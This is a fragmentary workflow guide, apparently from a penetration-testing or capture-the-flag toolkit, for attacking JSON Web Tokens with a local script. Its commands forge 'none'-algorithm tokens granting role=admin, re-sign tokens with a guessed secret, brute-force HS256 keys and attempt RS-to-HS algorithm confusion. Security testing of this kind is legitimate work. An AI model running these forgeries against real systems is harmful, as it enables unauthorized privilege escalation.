...
Use this workflow when the target uses JWT for session or authorization checks.
...
```bash
python3 src/tools/web/jwt_tool.py inspect \
  --token 'eyJ...'
```
...
```bash
python3 src/tools/web/jwt_tool.py make-none \
  --token 'eyJ...' \
  --set role=admin
```
...
```bash
python3 src/tools/web/jwt_tool.py resign-hs256 \
  --token 'eyJ...' \
  --secret secret123 \
  --set role=admin
```
...
```bash
python3 src/tools/web/jwt_tool.py bruteforce-hs256 \
  --token 'eyJ...' \
...
```bash
python3 src/tools/web/jwt_tool.py rs-to-hs \
  --token 'eyJ...' \
  --set role=admin \
...
Switch away from this workflow when:
